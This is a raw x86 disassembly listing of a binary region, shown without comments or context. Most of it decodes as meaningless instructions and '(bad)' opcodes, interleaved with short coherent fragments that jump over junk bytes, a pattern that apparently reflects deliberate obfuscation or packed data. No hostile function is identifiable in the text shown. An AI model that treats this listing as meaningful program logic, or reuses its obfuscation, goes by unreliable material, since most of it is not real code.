  41aea1:	stos   DWORD PTR es:[edi],eax
  41aea2:	repz pop edi
  41aea4:	(bad)  
  41aea5:	sbb    al,0x10
  41aea7:	dec    edi
  41aea8:	and    BYTE PTR [ebp-0x40580ba0],ah
  41aeae:	push   ebp
  41aeaf:	ret    
  41aeb0:	fisttp QWORD PTR [edx+0x7c]
  41aeb3:	inc    edi
  41aeb4:	sub    al,0x18
  41aeb6:	mov    edi,0xc22f57cf
  41aebb:	push   eax
  41aebc:	adc    cl,BYTE PTR [eax-0x3fa0ca6f]
  41aec2:	std    
  41aec3:	ret    
  41aec4:	iret   
  41aec5:	pushf  
  41aec6:	out    0x5d,al
  41aec8:	push   0x40ef8ac7
  41aecd:	jbe    0x41ae6b
  41aecf:	or     BYTE PTR ds:0x2bd8a787,cl
  41aed5:	add    DWORD PTR [ebx-0x1259141],eax
  41aedb:	mov    cl,0x40
  41aedd:	jno    0x41af41
  41aedf:	and    bl,BYTE PTR [edi-0x5d54cd68]
  41aee5:	xlat   BYTE PTR ds:[ebx]
  41aee6:	cmp    eax,0xcef54bcc
  41aeeb:	xlat   BYTE PTR ds:[ebx]
  41aeec:	adc    DWORD PTR fs:[eax-0xf2b3be],eax
  41aef3:	jae    0x41ae9f
  41aef5:	into   
  41aef6:	and    ah,BYTE PTR [eax-0x636606bd]
  41aefc:	sub    ah,bh
  41aefe:	rol    al,cl
  41af00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af01:	mov    eax,ds:0xb8444f1d
  41af06:	scas   eax,DWORD PTR es:[edi]
  41af07:	fidivr WORD PTR [ecx+0x297cd1ea]
  41af0d:	sbb    eax,0xab417cc0
  41af12:	loopne 0x41af1f
  41af14:	retf   
  41af15:	mov    edx,0x37f9
  41af1a:	sub    edx,eax
  41af1c:	jmp    0x41afe9
  41af21:	mov    eax,ds:0xbf2c0c12
  41af26:	mov    eax,ds:0xd902fc9f
  41af2c:	jo     0x41af54
  41af2e:	je     0x41aeef
  41af30:	mov    gs,WORD PTR [ecx]
  41af32:	aaa    
  41af33:	add    DWORD PTR [eax],eax
  41af35:	mov    al,0x0
  41af37:	add    BYTE PTR [eax],al
  41af39:	clc    
  41af3a:	stos   BYTE PTR es:[edi],al
  41af3b:	outs   dx,BYTE PTR ds:[esi]
  41af3c:	retf   
  41af3d:	adc    ah,BYTE PTR [edx-0x63167e57]
  41af43:	mov    eax,ds:0xf1751600
  41af48:	out    0xd1,al
  41af4a:	imul   ebx,DWORD PTR [ecx+0x7046a9ef],0x116624a6
  41af54:	fadd   DWORD PTR [ecx]
  41af56:	fcom   DWORD PTR [edi+eiz*1]
  41af59:	fadd   st,st(6)
  41af5b:	mov    DWORD PTR [edx-0x2],ecx
  41af5e:	or     al,0x80
  41af60:	xor    BYTE PTR [edx+esi*8-0x6d5275e2],bh
  41af67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af68:	arpl   WORD PTR [esi],dx
  41af6a:	mov    ecx,0x86d91870
  41af6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af70:	cmp    ah,BYTE PTR [ebp+0x32]
  41af73:	aam    0xa0
  41af75:	mov    bh,0x2a
  41af77:	adc    eax,0xa8e36340
  41af7c:	pop    ebx
  41af7d:	fimul  DWORD PTR [edx+eax*4-0x24]
  41af81:	mov    eax,ds:0xf3ab5ed3
  41af86:	or     ebx,ebx
  41af88:	out    dx,al
  41af89:	jl     0x41af24
  41af8b:	and    al,0x82
  41af8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af8e:	cmp    DWORD PTR [ecx],0x5a
  41af91:	jp     0x41af7f
  41af93:	daa    
  41af94:	aad    0xaa
  41af96:	aas    
  41af97:	aaa    
  41af98:	sub    edx,DWORD PTR [ebp+0x60]
  41af9b:	and    ebp,DWORD PTR [edx+edi*1+0x27]
  41af9f:	add    cl,BYTE PTR [eax-0x1bb8bf8f]
  41afa5:	dec    ebx
  41afa6:	iret   
  41afa7:	cli    
  41afa8:	fcomp  QWORD PTR [ebx+0x5]
  41afab:	outs   dx,BYTE PTR ds:[esi]
  41afac:	les    ebx,FWORD PTR [ebx-0x8]
  41afaf:	jo     0x41b02e
  41afb1:	in     eax,dx
  41afb2:	and    ebx,esi
  41afb4:	les    esi,FWORD PTR [ecx-0x7b3fdef7]
  41afba:	(bad)  
  41afbb:	ins    DWORD PTR es:[edi],dx
  41afbc:	push   0xde91984e
  41afc1:	add    al,0x50
  41afc3:	push   edx
  41afc4:	xor    DWORD PTR [edx],ebp
  41afc6:	in     eax,0xf9
  41afc8:	aaa    
  41afc9:	sbb    dl,cl
  41afcb:	pushf  
  41afcc:	pushf  
  41afcd:	sbb    DWORD PTR [edi+0x12],edx
  41afd0:	pop    ss
  41afd1:	enter  0xd4c3,0x5d
  41afd5:	popa   
  41afd6:	add    BYTE PTR [ecx+ebx*4],dl
  41afd9:	pop    ss
  41afda:	popf   
  41afdb:	inc    ecx
  41afdc:	and    BYTE PTR [esi],bl
  41afde:	fst    DWORD PTR [ebp+0x25]
  41afe1:	xor    al,0x29
  41afe3:	cwde   
  41afe4:	mov    esi,0xae7affcc
  41afe9:	mov    eax,DWORD PTR [ebp+0xc]
  41afec:	jmp    0x41b0b9
  41aff1:	clc    
  41aff2:	test   BYTE PTR [ebx+0x3d],dl
  41aff5:	jg     0x41aff6
  41aff7:	inc    ch
  41aff9:	push   ebp
  41affa:	dec    ebp
  41affb:	jae    0x41afff
  41affd:	mov    al,BYTE PTR [eax]
  41afff:	mov    ebx,0x137d9cd
  41b004:	add    BYTE PTR [eax-0x66000000],dh
  41b00a:	jl     0x41b020
  41b00c:	lods   eax,DWORD PTR ds:[esi]
  41b00d:	mov    al,0xdf
  41b00f:	jnp    0x41b06d
  41b011:	add    eax,0xaaffbc43
  41b016:	ins    BYTE PTR es:[edi],dx
  41b017:	out    dx,al
  41b018:	outs   dx,DWORD PTR ds:[esi]
  41b019:	xor    al,0xe4
  41b01b:	in     al,dx
  41b01c:	mov    eax,ds:0x2fe35047
  41b021:	call   0xe3e5:0xb31c8a2
  41b028:	adc    bh,ch
  41b02a:	jb     0x41b034
  41b02c:	and    ecx,DWORD PTR [ebx]
  41b02e:	xor    eax,0xd24da15d
  41b033:	scas   al,BYTE PTR es:[edi]
  41b034:	cwde   
  41b035:	std    
  41b036:	sti    
  41b037:	call   0xffc66e62
  41b03c:	mov    ebp,0x2ad4b3fb
  41b041:	outs   dx,DWORD PTR ds:[esi]
  41b042:	out    0xa1,al
  41b044:	inc    esi
  41b045:	mov    dh,0xbf
  41b047:	ret    0x30c5
  41b04a:	pushf  
  41b04b:	pop    edx
  41b04c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b04d:	ja     0x41b080
  41b04f:	mov    bl,0x46
  41b051:	mov    esi,0x5e25b021
  41b056:	les    ecx,FWORD PTR ds:0xa469a42b
  41b05c:	sti    
  41b05d:	sbb    edi,DWORD PTR [eax+0x5ba30c07]
  41b063:	adc    eax,0x2146052b
  41b068:	jns    0x41b0bf
  41b06a:	lea    edx,[eax-0x70]
  41b06d:	sub    esp,DWORD PTR [ebx+0x5c483ebc]
  41b073:	retf   
  41b074:	xchg   esp,eax
  41b075:	gs dec edi
  41b077:	(bad)  
  41b078:	lock dec ebx
  41b07a:	dec    eax
  41b07b:	mov    ds:0xe91cfa,eax
  41b080:	mov    ds:0xfdc5c225,al
  41b085:	cmp    eax,0x13ce0373
  41b08a:	pusha  
  41b08b:	or     eax,0xb4a23c9c
  41b090:	inc    ecx
  41b091:	xor    ah,ch
  41b093:	js     0x41b080
  41b095:	push   0x5c
  41b097:	add    al,cl
  41b099:	mov    cl,0x43
  41b09b:	add    al,0x66
  41b09d:	inc    edx
  41b09e:	xor    dh,BYTE PTR [ecx+0x104e84f5]
  41b0a4:	cmc    
  41b0a5:	lds    ecx,FWORD PTR [esp+esi*4+0x59]
  41b0a9:	(bad)  
  41b0ab:	mov    edi,0x4029eed2
  41b0b0:	out    dx,al
  41b0b1:	dec    edi
  41b0b2:	push   es
  41b0b3:	mov    ebp,0x3474e9a1
  41b0b8:	or     eax,0x5bfcbb
  41b0bd:	add    BYTE PTR [ebx],bl
  41b0bf:	fld    DWORD PTR [ebx]
  41b0c1:	adc    BYTE PTR [ebx],dl
  41b0c3:	pop    eax
  41b0c4:	add    al,0xe9
  41b0c6:	enter  0x0,0x0
  41b0ca:	jmp    0xeae7:0xda70def
  41b0d1:	out    dx,eax
  41b0d2:	jmp    0x19a6:0xcb70c3d1
  41b0d9:	fimul  WORD PTR [ecx-0x4ffffec8]
  41b0df:	add    BYTE PTR [eax],al
  41b0e1:	add    BYTE PTR [eax-0x64],ch
  41b0e4:	jl     0x41b08c
  41b0e6:	mov    edx,0xf2ed1cd9
  41b0eb:	or     al,0xfb
  41b0ed:	xor    DWORD PTR [ecx+0x3d90fa28],eax
  41b0f3:	cs aam 0x5d
  41b0f6:	push   edi
  41b0f7:	(bad)  
  41b0f8:	push   edi
  41b0f9:	push   edi
  41b0fa:	test   al,0x2e
  41b0fc:	sub    al,0x47
  41b0fe:	adc    al,0x97
  41b100:	not    ebx
  41b102:	or     BYTE PTR [edx+0x3beb7d78],0xe8
  41b109:	jns    0x41b120
  41b10b:	ja     0x41b0ac
  41b10d:	mov    edi,0x55aaa39
  41b112:	rcr    dl,1
  41b114:	add    al,ah
  41b116:	mov    bl,0xad
  41b118:	or     eax,0xb36debe4
  41b11d:	add    bl,BYTE PTR [ebx+ecx*2-0x17eb73eb]
  41b124:	inc    ecx
  41b125:	or     eax,0x71706b
  41b12a:	daa    
  41b12b:	mov    esp,0x6e7d5796
  41b130:	dec    ebx
  41b131:	int3   
  41b132:	pop    ebx
  41b133:	mov    ecx,0x4142fb44
  41b138:	leave  
  41b139:	and    ebp,esp
  41b13b:	ins    BYTE PTR es:[edi],dx
  41b13c:	loop   0x41b128
  41b13e:	lods   al,BYTE PTR ds:[esi]
  41b13f:	mov    edi,0xe8973b98
  41b144:	dec    eax
  41b145:	retf   
  41b146:	push   esp
  41b147:	jns    0x41b183
  41b149:	sbb    al,0x47
  41b14b:	(bad)
  41b14f:	fisub  DWORD PTR [ebx+0x72]
  41b152:	into   
  41b153:	xor    esi,DWORD PTR ds:0x66f187c7
  41b159:	add    esp,DWORD PTR [ecx]
  41b15b:	xchg   DWORD PTR [ecx-0xc],ecx
  41b15e:	mov    ebp,0x69437bef
  41b163:	mov    ?,WORD PTR ds:0x56ad8b2d
  41b16a:	gs inc esi
  41b16c:	sub    al,0x16
  41b16e:	or     BYTE PTR [ecx-0x42],0xa3
  41b172:	mov    al,ds:0x3a6ccba6
  41b177:	(bad)  
  41b178:	rcr    BYTE PTR [edx-0x39],cl
  41b17b:	or     edx,ebx
  41b17d:	or     dh,BYTE PTR [edx]
  41b17f:	adc    BYTE PTR [ebp-0x7a3f73d0],ch
  41b185:	mov    bh,0x3
  41b187:	push   ss
  41b188:	bnd js 0x41b15b
  41b18b:	adc    al,0x75
  41b18d:	int3   
  41b18e:	adc    ah,dl
  41b190:	and    cl,dh
  41b192:	xor    edx,edi
  41b194:	xor    ebx,esi
  41b196:	jmp    0x41b263
  41b19b:	mov    cl,al
  41b19d:	sbb    al,0x88
  41b19f:	pop    esi
  41b1a0:	fcomp  QWORD PTR [esi+0x223a65ca]
  41b1a6:	mov    esp,0x2759f32
  41b1ab:	cmp    DWORD PTR [ecx],edi
  41b1ad:	add    DWORD PTR [eax],eax
  41b1af:	mov    al,0x0
  41b1b1:	add    BYTE PTR [eax],al
  41b1b3:	jb     0x41b190
  41b1b5:	xchg   ebx,eax
  41b1b6:	fwait
  41b1b7:	adc    al,0x9c
  41b1b9:	push   edi
  41b1ba:	loopne 0x41b20e
  41b1bc:	test   BYTE PTR [edi],bh
  41b1be:	lods   al,BYTE PTR ds:[esi]
  41b1bf:	fcmovnbe st,st(3)
  41b1c1:	and    DWORD PTR [ebx+0x23],ecx
  41b1c4:	fs retf 
  41b1c6:	addr16 addr16 (bad) 
  41b1c9:	xlat   BYTE PTR ds:[ebx]
  41b1ca:	(bad)  
  41b1cb:	push   0x8fff640d
  41b1d0:	cmp    BYTE PTR [edx+0x6a],ch
  41b1d3:	fsub   DWORD PTR [edx]
  41b1d5:	cmc    
  41b1d6:	leave  
  41b1d7:	ins    DWORD PTR es:[edi],dx
  41b1d8:	loopne 0x41b1e5
  41b1da:	add    BYTE PTR gs:[ecx],ah
  41b1dd:	popf   
  41b1de:	xchg   ecx,eax
  41b1df:	lods   eax,DWORD PTR ds:[esi]
  41b1e0:	xchg   ebp,eax
  41b1e1:	mov    dh,0xdd
  41b1e3:	cli    
  41b1e4:	call   0x16eb:0x428cb770
  41b1eb:	neg    BYTE PTR [ebx-0xd]
  41b1ee:	out    dx,eax
  41b1ef:	in     eax,0x5a
  41b1f1:	xchg   edx,eax
  41b1f2:	xchg   DWORD PTR ds:0xad89e396,ecx
  41b1f8:	and    ebp,DWORD PTR [esi]
  41b1fa:	addr16 adc bh,ah
  41b1fd:	mov    esi,0xb6d12c7d
  41b202:	(bad)  
  41b204:	sbb    ch,BYTE PTR [ebx+0x298eb40f]
  41b20a:	stos   BYTE PTR es:[edi],al
  41b20b:	pop    esp
  41b20c:	pushf  
  41b20d:	and    DWORD PTR [esi],ecx
  41b20f:	and    eax,0x6fad1306
  41b214:	mov    ebp,0xe8321eca
  41b219:	jno    0x41b284
  41b21b:	(bad)  
  41b21c:	and    eax,0x949e9c3a
  41b221:	jnp    0x41b296
  41b223:	inc    eax
  41b224:	in     eax,0x9d
  41b226:	pop    esp
  41b227:	dec    ecx
  41b228:	mov    ecx,0x96eea80a
  41b22d:	or     DWORD PTR [edx+0x4b],ebx
  41b230:	xlat   BYTE PTR ds:[ebx]
  41b231:	jg     0x41b270
  41b233:	mov    esp,0x83e030bc
  41b238:	jmp    0x41b2b8
  41b23a:	pop    ds
  41b23b:	mov    WORD PTR [ebp-0x45a9a0b0],ds
  41b241:	and    BYTE PTR [esi],ch
  41b243:	xchg   BYTE PTR [eax-0x2c6c46f3],ah
  41b249:	enter  0x3a81,0x36
  41b24d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b24e:	bnd jmp DWORD PTR [eax-0x63]
  41b252:	mov    ds:0x54593d55,eax
  41b257:	fld    QWORD PTR [ecx-0x3fa0360d]
  41b25d:	ja     0x41b2cb
  41b25f:	mov    edi,0x818b7adb
  41b264:	ret    0x624d
  41b267:	mov    eax,0xb8558999
  41b26c:	adc    ebx,0x8ddc
  41b272:	mov    DWORD PTR [ebp-0x44],ebx
  41b275:	mov    eax,DWORD PTR [ebp-0x50]
  41b278:	mov    ecx,DWORD PTR [ebp-0x4c]
  41b27b:	mov    edx,DWORD PTR [ebp-0x58]
  41b27e:	mov    esi,DWORD PTR [ebp-0x54]
  41b281:	and    eax,edx
  41b283:	jmp    0x41b350
  41b288:	ss mov eax,0xfbdfda53
  41b28e:	mov    edi,0xf80208fc
  41b293:	fiadd  WORD PTR [esi]
  41b295:	jl     0x41b2cc
  41b297:	fsubp  st(1),st
  41b299:	cmp    DWORD PTR [ecx],eax
  41b29b:	add    BYTE PTR [eax-0x72000000],dh
  41b2a1:	cdq    
  41b2a2:	add    BYTE PTR [edi],al
  41b2a4:	scas   al,BYTE PTR es:[edi]
  41b2a5:	cld    
  41b2a6:	xchg   esi,eax
  41b2a7:	ss xchg ebx,eax
  41b2a9:	(bad)  
  41b2aa:	shr    BYTE PTR [esi-0xbe0b394],cl
  41b2b0:	inc    edi
  41b2b1:	loop   0x41b266
  41b2b3:	ja     0x41b2b8
  41b2b5:	add    eax,0x6ac5c0ab
  41b2ba:	sbb    DWORD PTR [eax],ecx
  41b2bc:	cwde   
  41b2bd:	cmp    al,0x2c
  41b2bf:	scas   eax,DWORD PTR es:[edi]
  41b2c0:	sbb    dl,al
  41b2c2:	add    al,0x21
  41b2c4:	cmc    
  41b2c5:	rol    BYTE PTR [esi+0x7e88be32],0x9d
  41b2cc:	cmp    eax,0xc719c9db
  41b2d1:	test   eax,0xb2220783
  41b2d6:	(bad)  
  41b2d7:	fnstsw WORD PTR [edx]
  41b2d9:	pusha  
  41b2da:	xchg   edi,eax
  41b2db:	outs   dx,DWORD PTR ds:[esi]
  41b2dc:	gs cmp ecx,ecx
  41b2df:	mov    al,0x21
  41b2e1:	xchg   BYTE PTR [esi-0x3954a3c6],cl
  41b2e7:	hlt    
  41b2e8:	sub    al,0xcd
  41b2ea:	imul   ecx,DWORD PTR [edi-0x379732e0],0x9c3961da
  41b2f4:	xor    al,0x9b
  41b2f6:	test   al,0xc0
  41b2f8:	pop    edi
  41b2f9:	fdiv   QWORD PTR [edi]
  41b2fb:	loope  0x41b2f7
  41b2fd:	das    
  41b2fe:	jnp    0x41b294
  41b300:	leave  
  41b301:	jb     0x41b34d
  41b303:	shl    esp,1
  41b305:	cmp    al,0x72
  41b307:	ja     0x41b2d1
  41b309:	fild   QWORD PTR [ebp-0x17beb1d0]
  41b30f:	and    esp,esp
  41b311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b312:	das    
  41b313:	jmp    0x4634:0xe1d8a7d
  41b31a:	xor    esp,DWORD PTR [ebp-0x32]
  41b31d:	ins    DWORD PTR es:[edi],dx
  41b31e:	enter  0xe31b,0x19
  41b322:	cmp    edi,DWORD PTR [ecx]
  41b324:	add    bl,BYTE PTR [ecx]
  41b326:	xchg   ebx,eax
  41b327:	cmp    DWORD PTR [ecx-0xc1d295c],esp
  41b32d:	clc    
  41b32e:	xchg   edi,eax
  41b32f:	dec    edx
  41b330:	or     al,al
  41b332:	popf   
  41b333:	jmp    0x1a104a7f
  41b338:	push   eax
  41b339:	call   0xc8ae:0xf070a0a0
  41b340:	int3   
  41b341:	sub    DWORD PTR [ecx],esp
  41b343:	or     bh,cl
  41b345:	jo     0x41b30a
  41b347:	aaa    
  41b348:	xor    dh,BYTE PTR [ecx+0x1e]
  41b34b:	dec    esi
  41b34c:	ja     0x41b342
  41b34e:	and    al,0x42
  41b350:	mov    edx,DWORD PTR [ebp-0x60]
  41b353:	and    ecx,esi
  41b355:	jmp    0x41b422
  41b35a:	pop    ss
  41b35b:	ins    DWORD PTR es:[edi],dx
  41b35c:	scas   al,BYTE PTR es:[edi]
  41b35d:	fdivp  st(6),st
  41b35f:	fbstp  TBYTE PTR [edi-0x13]
  41b362:	mov    al,ds:0x31de2217
  41b367:	add    eax,0x3a990df2
  41b36c:	add    DWORD PTR [eax],eax
  41b36e:	mov    al,0x0
  41b370:	add    BYTE PTR [eax],al
  41b372:	xchg   ecx,eax
  41b373:	fisttp DWORD PTR [edx-0x2c]
  41b376:	jno    0x41b3e0
  41b378:	jne    0x41b3a4
  41b37a:	mov    DWORD PTR [edx+edx*1+0x4ffc8ba4],ebx
  41b381:	xor    bh,cl
  41b383:	stos   BYTE PTR es:[edi],al
  41b384:	adc    dl,BYTE PTR [bp+di]
  41b387:	call   0x88910585
  41b38c:	aam    0x9d
  41b38e:	sub    al,0x90
  41b390:	icebp  
  41b391:	lea    ebx,ds:0xffae78bd
  41b397:	xchg   edx,eax
  41b398:	mov    WORD PTR [bp+si+0x57],gs
  41b39c:	stc    
  41b39d:	mov    bl,0xe7
  41b39f:	int    0xff
  41b3a1:	or     al,0x27
  41b3a3:	int    0x76
  41b3a5:	imul   esi,ebp,0x665857d3
  41b3ab:	mov    edi,DWORD PTR [edi]
  41b3ad:	js     0x41b3c2
  41b3af:	retf   
  41b3b0:	jae    0x41b36a
  41b3b2:	jmp    0x28fc:0x4f1d4a21
  41b3b9:	leave  
  41b3ba:	aas    
  41b3bb:	pavgb  mm1,QWORD PTR [ecx+eax*1-0x493686cf]
  41b3c3:	aam    0x10
  41b3c5:	ret    
  41b3c6:	and    ah,BYTE PTR [ebx+0x3b2325bb]
  41b3cc:	ins    DWORD PTR es:[edi],dx
  41b3cd:	and    esi,DWORD PTR [edi+0x5425562f]
  41b3d3:	inc    ebp
  41b3d4:	in     al,0x31
  41b3d6:	sbb    bh,al
  41b3d8:	stos   BYTE PTR es:[edi],al
  41b3d9:	xchg   ecx,eax
  41b3da:	cs mov ebx,0x308b6523
  41b3e0:	jbe    0x41b3a0
  41b3e2:	aas    
  41b3e3:	and    BYTE PTR [edi-0x1e],cl
  41b3e6:	pop    edx
  41b3e7:	test   DWORD PTR ds:0xd0d080aa,ecx
  41b3ed:	in     al,0xaf
  41b3ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3f0:	ins    BYTE PTR es:[edi],dx
  41b3f1:	bound  edx,QWORD PTR [ebp-0x3f]
  41b3f4:	inc    edi
  41b3f5:	popf   
  41b3f6:	mov    ecx,0xfffb5f57
  41b3fb:	cmp    DWORD PTR [esi],edx
  41b3fd:	or     eax,0x7e6addf2
  41b402:	mov    al,ds:0xaaf06d62
  41b407:	aad    0x6b
  41b409:	mov    DWORD PTR [ecx+0x7e],ebp
  41b40c:	jle    0x41b390
  41b40e:	mov    cl,0x9b
  41b410:	out    0x5e,eax
  41b412:	call   0xc1d9a2b
  41b417:	sbb    eax,0x7e252e58
  41b41c:	retf   0xeb5a
  41b41f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b420:	sub    eax,0xa4758b98
  41b425:	push   esi
  41b426:	push   edx
  41b427:	push   ecx
  41b428:	push   eax
  41b429:	call   0x423dad
  41b42e:	mov    ecx,eax
  41b430:	mov    eax,DWORD PTR [ebp-0x68]
  41b433:	mov    esi,DWORD PTR [ebp-0x64]
  41b436:	jmp    0x41b503
  41b43b:	sub    al,0x97
  41b43d:	mov    cl,0x45
  41b43f:	mov    ebx,0x19fffc67
  41b444:	aad    0x92
  41b446:	int    0xd4
  41b448:	test   eax,0x3b49de22
  41b44d:	add    DWORD PTR [eax],eax
  41b44f:	mov    al,0x0
  41b451:	add    BYTE PTR [eax],al
  41b453:	and    edx,ebx
  41b455:	ror    BYTE PTR [edx-0x51],0x70
  41b459:	les    ecx,FWORD PTR [ebx-0x31]
  41b45c:	repnz or BYTE PTR [ebp+0x4a6886ae],0x20
  41b464:	jmp    0x69fa:0xd1e4b5b
  41b46b:	mov    al,0xb8
  41b46d:	or     al,al
  41b46f:	pop    ds
  41b470:	mov    ds:0x572ca65b,eax
  41b475:	dec    edx
  41b476:	retf   
  41b477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b478:	arpl   WORD PTR [eax],dx
  41b47a:	rol    BYTE PTR [edx+0x76a51cd3],cl
  41b480:	out    dx,al
  41b481:	pop    ebx
  41b482:	loop   0x41b4f8
  41b484:	xchg   ebp,eax
  41b485:	test   dh,bh
  41b487:	std    
  41b488:	fimul  WORD PTR [esi-0x69fa6be7]
  41b48e:	outs   dx,DWORD PTR ds:[esi]
  41b48f:	loop   0x41b431
  41b491:	mov    al,ds:0x30318ed1
  41b496:	xor    al,0x14
  41b498:	add    al,0x52
  41b49a:	jecxz  0x41b4d8
  41b49c:	call   0xc222:0x4781708
  41b4a3:	mov    edi,0x7b97cd3
  41b4a8:	dec    eax
  41b4a9:	push   cs
  41b4aa:	mov    ebp,0x3475eaef
  41b4af:	xlat   BYTE PTR ds:[ebx]
  41b4b0:	addr16 or eax,0xf7b2ebca
  41b4b6:	dec    esi
  41b4b7:	gs ss scas eax,DWORD PTR es:[edi]
  41b4ba:	pushf  
  41b4bb:	imul   ebx,esi,0xffffffd5
  41b4be:	pushf  
  41b4bf:	fist   DWORD PTR [ebp-0x18]
  41b4c2:	sub    eax,0x62a0f10b
  41b4c7:	and    esi,ebx
  41b4c9:	sahf   
  41b4ca:	fist   DWORD PTR [eax-0x60060c5f]
  41b4d0:	leave  
  41b4d1:	jmp    0x8925:0x71640d50
  41b4d8:	js     0x41b4b2
  41b4da:	in     al,dx
  41b4db:	loop   0x41b513
  41b4dd:	pusha  
  41b4de:	les    esp,FWORD PTR [ebx-0xa]
  41b4e1:	pop    es
  41b4e2:	data16 test BYTE PTR [edi+0x14],0x3d
  41b4e7:	mov    ebx,0x68e08b06
  41b4ec:	push   esp
  41b4ed:	push   edx
  41b4ee:	adc    edx,edx
  41b4f0:	and    ecx,ecx
  41b4f2:	xchg   ebx,eax
  41b4f3:	adc    eax,0x127ce450
  41b4f8:	xchg   ebx,eax
  41b4f9:	pop    edx
  41b4fa:	xor    DWORD PTR [ebp-0x50],ebx
  41b4fd:	jno    0x41b547
  41b4ff:	cdq    
  41b500:	adc    ebp,edx
  41b502:	mov    dh,0x81
  41b504:	loope  0x41b4df
  41b506:	inc    esp
  41b507:	add    BYTE PTR [eax],al
  41b509:	and    edx,0x26bf
  41b50f:	or     ecx,eax
  41b511:	mov    eax,DWORD PTR [ebp-0x48]
  41b514:	or     edx,esi
  41b516:	mov    esi,DWORD PTR [ebp-0x44]
  41b519:	jmp    0x41b5e6
  41b51e:	lahf   
  41b51f:	sub    DWORD PTR [edi],ebp
  41b521:	test   BYTE PTR [edi-0x3cc4407a],bh
  41b527:	xor    edx,eax
  41b529:	dec    esi
  41b52a:	jo     0x41b50f
  41b52c:	inc    ebx
  41b52d:	sbb    al,0xf9
  41b52f:	cmp    eax,DWORD PTR [ecx]
  41b531:	add    BYTE PTR [eax-0x55000000],dh
  41b537:	and    al,0xda
  41b539:	cmp    esp,ebx
  41b53b:	push   ecx
  41b53c:	xchg   edi,eax
  41b53d:	pop    ecx
  41b53e:	mov    ds:0x92d63c01,al
  41b543:	add    DWORD PTR ds:0x1df2e1f4,esp
  41b549:	mov    edx,0xe660da1b
  41b54e:	pop    es
  41b54f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b550:	pop    ss
  41b551:	pop    ecx
  41b552:	test   al,0x32
  41b554:	xchg   edx,eax
  41b555:	cdq    
  41b556:	js     0x41b4f8
  41b558:	(bad)  
  41b55a:	sbb    eax,0x78e62ce1
  41b55f:	rcr    DWORD PTR [edi-0x45],1
  41b562:	dec    esi
  41b563:	repz adc DWORD PTR [ebp+0x248a8852],eax
  41b56a:	retf   0xbe55
  41b56d:	pop    ecx
  41b56e:	out    dx,al
  41b56f:	lock shr BYTE PTR [edx+0x30f76a10],cl
  41b576:	sbb    edi,edx
  41b578:	(bad)  
  41b579:	and    bl,BYTE PTR [ebp+0x41]
  41b57c:	(bad)
  41b580:	cmp    esp,DWORD PTR [ebx]
  41b582:	dec    esp
  41b583:	sub    BYTE PTR [ebx-0x24544d5b],dl
  41b589:	add    BYTE PTR [edx+ebx*8],cl
  41b58c:	lods   eax,DWORD PTR ds:[esi]
  41b58d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b58e:	loopne 0x41b597
  41b590:	or     dl,BYTE PTR [edx+ecx*4-0x212aaf40]
  41b597:	xchg   ebx,eax
  41b598:	jg     0x41b58b
  41b59a:	and    BYTE PTR [edi+0x51],ch
  41b59d:	mov    WORD PTR [edi],?
  41b59f:	pop    es
  41b5a0:	ror    DWORD PTR [edx+ebx*4+0x48],1
  41b5a4:	dec    ebx
  41b5a5:	inc    esp
  41b5a6:	int    0x72
  41b5a8:	cmp    eax,0xaf590e14
  41b5ad:	inc    ecx
  41b5ae:	pop    ebp
  41b5af:	xor    bh,bl
  41b5b1:	mov    dh,0x8
  41b5b3:	loopne 0x41b595
  41b5b5:	(bad)  
  41b5b6:	popa   
  41b5b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5b8:	sti    
  41b5b9:	lds    esi,FWORD PTR ds:0x11259a25
  41b5bf:	stos   BYTE PTR es:[edi],al
  41b5c0:	inc    esp
  41b5c1:	hlt    
  41b5c2:	push   0xffffffcc
  41b5c4:	pusha  
  41b5c5:	jg     0x41b610
  41b5c7:	mov    dl,0xda
  41b5c9:	mov    BYTE PTR [eax],bl
  41b5cb:	push   edi
  41b5cc:	shr    BYTE PTR [edx],cl
  41b5ce:	dec    eax
  41b5cf:	xchg   DWORD PTR [edi-0x2f],ecx
  41b5d2:	clc    
  41b5d3:	mov    esi,0xe54d5bdb
  41b5d8:	sbb    edi,DWORD PTR [ebx+0x503e66a]
  41b5de:	loop   0x41b63e
  41b5e0:	inc    esp
  41b5e1:	add    BYTE PTR [ebx],bh
  41b5e3:	lods   eax,DWORD PTR ds:[esi]
  41b5e4:	jbe    0x41b5f2
  41b5e6:	xor    ecx,0x7ede
  41b5ec:	xor    edx,0x7662
  41b5f2:	add    ecx,eax
  41b5f4:	mov    eax,DWORD PTR [ebp+0x8]
  41b5f7:	pop    edi
  41b5f8:	jmp    0x41b6c5
  41b5fd:	adc    al,0x45
  41b5ff:	fstp   DWORD PTR [eax-0x27]
  41b602:	fcom   QWORD PTR [ebp-0x58c388b3]
  41b608:	jp     0x41b66a
  41b60a:	out    dx,eax
  41b60b:	leave  
  41b60c:	addr16 test eax,0xb000013c
  41b612:	add    BYTE PTR [eax],al
  41b614:	add    BYTE PTR [ebx],dl
  41b616:	int    0xec
  41b618:	icebp  
  41b619:	sub    ecx,DWORD PTR [edx]
  41b61b:	mov    al,ds:0x99db6111
  41b620:	test   edi,esi
  41b622:	or     eax,0xe75fb888
  41b627:	jg     0x41b643
  41b629:	repnz sbb DWORD PTR [esi+0x9],ebp
  41b62d:	lods   al,BYTE PTR ds:[esi]
  41b62e:	xor    eax,0x5de32dfc
  41b633:	inc    eax
  41b634:	xchg   ebp,eax
  41b635:	inc    ecx
  41b636:	pop    es
  41b637:	std    
  41b638:	test   BYTE PTR ds:0x227f9547,dh
  41b63e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b63f:	jnp    0x41b6a5
  41b641:	xchg   ecx,eax
  41b642:	stos   BYTE PTR es:[edi],al
  41b643:	repnz aas 
